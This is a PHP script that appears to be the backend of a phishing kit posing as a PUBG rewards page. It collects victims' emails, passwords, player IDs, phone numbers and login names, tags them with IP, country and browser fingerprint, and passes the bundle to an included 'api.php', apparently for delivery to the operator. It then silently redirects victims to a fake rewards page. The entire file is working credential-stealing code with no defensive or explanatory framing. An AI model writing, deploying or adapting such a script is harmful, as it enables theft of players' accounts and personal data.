<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$login = $_POST['login'];

//auth license //

if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{

//Sitemap include //


$msg = ("
[+]=========== ACC PUBG ===========[+]
[Login] = ".$login."
[Email]  = ".$email."
[Pass]  = ".$password."
[Id] = ".$playid."
[phone] = ".$phone."

[+]============System============[+]
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."

[TIME/DATE] =".$times." / ".$date."

[Country] = ".$country."

[FINGERPRINT] = ".$useragent."
");

$url = $msg;include("api.php");

if($url) {
echo "<form id='imnoob59' method='POST' action='../../rewards.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('imnoob59').submit();</script>";
}
}
?>